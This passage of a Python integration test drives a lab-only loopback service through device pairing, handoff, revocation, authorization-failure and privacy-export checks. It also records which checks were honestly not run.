        chh = self._auth_headers(PORT_B, "POST", "/devices/device-j11/confirm", token)
        cf, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/devices/device-j11/confirm",
            {"challenge": en["challenge"]},
            headers=chh,
        )
        assert st == 200
        assert cf["paired"] is True
        hh = self._auth_headers(PORT_B, "POST", "/handoffs", token)
        ho, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/handoffs",
            {"device_id": "device-j11", "package_core_id": CORE, "recipe_id": RECIPE},
            headers=hh,
        )
        assert st == 201
        hid = ho["body"]["handoff_id"]
        got_ho, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/handoffs/{hid}",
            headers={"Authorization": "Bearer " + token},
        )
        assert st == 200
        assert got_ho["object_type"] == "CapabilityHandoff"
        assert got_ho.get("body_id")
        # Browser token-in-URI is not an Authorization header.
        _, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/handoffs/{hid}?access_token={token}",
            expect_error=True,
        )
        assert st == 401
        _, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/handoffs/{hid}",
            expect_error=True,
        )
        assert st == 401
        _, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/handoffs/handoff-missing",
            headers={"Authorization": "Bearer " + token},
            expect_error=True,
        )
        assert st == 404
        rph = self._auth_headers(PORT_B, "POST", "/devices/device-j11/reports", token)
        _, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/devices/device-j11/reports",
            {},
            headers=rph,
            expect_error=True,
        )
        assert st in (400, 403)
        lst, _ = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/devices/device-j11/handoffs",
            headers={"Authorization": "Bearer " + token},
        )
        assert lst.get("outbound_only") is True
        assert lst.get("inbound_execution_port") is False
        other = self._lab_token(PORT_B, verifier="pkce-verifier-other-bbbb", account="account-other")
        cross, st = self._http(
            "GET",
            f"http://127.0.0.1:{PORT_B}/devices/device-j11/handoffs",
            headers={"Authorization": "Bearer " + other},
            expect_error=True,
        )
        assert st == 404
        rvk = self._auth_headers(PORT_B, "POST", "/devices/device-j11/revoke", token)
        rv, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/devices/device-j11/revoke", {}, headers=rvk)
        assert st == 200
        assert rv.get("revoked") is True
        denied, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/handoffs",
            {"device_id": "device-j11", "package_core_id": CORE, "recipe_id": RECIPE},
            headers=self._auth_headers(PORT_B, "POST", "/handoffs", token),
            expect_error=True,
        )
        assert st == 403
        assert self._ecode(denied) == "DEVICE_NOT_PAIRED"
        self._honest("J11", "not a real browser; loopback HTTP pairing/handoff/revoke only")

    def _j12_privacy_independence(self):
        token = self.token
        planted = "PROMPT-J12-PLANTED"
        xh = self._auth_headers(PORT_B, "POST", "/exports", token)
        ex, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/exports",
            {"prompt": planted, "include_secrets": True},
            headers=xh,
        )
        assert st == 202
        dump = self._dump(ex)
        assert planted not in dump
        assert "PROMPT" not in dump
        hits, _ = self._http("POST", f"http://127.0.0.1:{PORT_B}/capabilities/search", {"q": planted})
        assert planted not in self._dump(hits)
        well_a, _ = self._get(f"http://127.0.0.1:{PORT_A}/.well-known/oauth-authorization-server")
        well_b, _ = self._get(f"http://127.0.0.1:{PORT_B}/.well-known/oauth-authorization-server")
        assert well_a.get("not_live_cex_idp") is True
        assert well_a.get("lab_only") is True
        assert well_b.get("not_live_cex_idp") is True
        assert well_b.get("lab_only") is True
        drh = self._auth_headers(PORT_B, "POST", "/research/drafts", token)
        dr, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/research/drafts", {}, headers=drh)
        assert st == 201
        did = dr["draft_id"]
        vh_fail = self._auth_headers(PORT_B, "POST", f"/research/drafts/{did}/validate", token)
        badv, st = self._http(
            "POST",
            f"http://127.0.0.1:{PORT_B}/research/drafts/{did}/validate",
            {"fail": True},
            headers=vh_fail,
            expect_error=True,
        )
        assert st == 400
        assert badv.get("valid") is False
        vh = self._auth_headers(PORT_B, "POST", f"/research/drafts/{did}/validate", token)
        _, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/research/drafts/{did}/validate", {}, headers=vh)
        assert st == 200
        pubh = self._auth_headers(PORT_B, "POST", f"/research/drafts/{did}/publish", token)
        _, st = self._http("POST", f"http://127.0.0.1:{PORT_B}/research/drafts/{did}/publish", {}, headers=pubh)
        assert st == 202
        self._stop_one("B")
        a2, st = self._get(f"http://127.0.0.1:{PORT_A}/profile")
        assert st == 200
        assert a2["object_type"] == "ProviderProfile"
        pkg, st, _ = self._raw("GET", f"http://127.0.0.1:{PORT_A}/packages/{CORE}")
        assert st == 200
        assert pkg.startswith("BTXPKG")
        try:
            self._get(f"http://127.0.0.1:{PORT_B}/profile")
            raise AssertionError("finance origin B still serving after stop")
        except (urllib.error.URLError, ConnectionError, OSError, TimeoutError):
            pass
        self._honest(
            "J12",
            "live CUDA / packet-capture of prompts+KV+CEX tokens not run; EnsureLocal after "
            "gateway loss is native-only (no HTTP readiness port)",
        )

    def run_test(self):
        self._start("A", PORT_A, False)
        self._start("B", PORT_B, True)
        try:
            self._j01_free_hosted_discovery()
            self._hosted_accept_good()
            self._j02_locality_wins()
            self._j03_release_funding()
            self._j04_conversion_partial()
            self._j05_unknown_broadcast()
            self._j06_no_award_refund()
            self._j07_subscription_concurrency()
            self._j08_malicious_provider()
            self._j09_provider_exit()
            self._j10_custody_failure_drill()
            self._j11_fleet_browser()
            self._j12_privacy_independence()
            seen = {j for j, _ in self.not_run}
            for jid in ("J01", "J02", "J03", "J04", "J05", "J06", "J07", "J09", "J10", "J11", "J12"):
                if jid not in seen:
                    raise AssertionError(f"missing HONEST_NOT_RUN row for {jid}")
        finally:
            self._stop()


if __name__ == "__main__":
    ModelNetHcpJourneys(__file__).main()
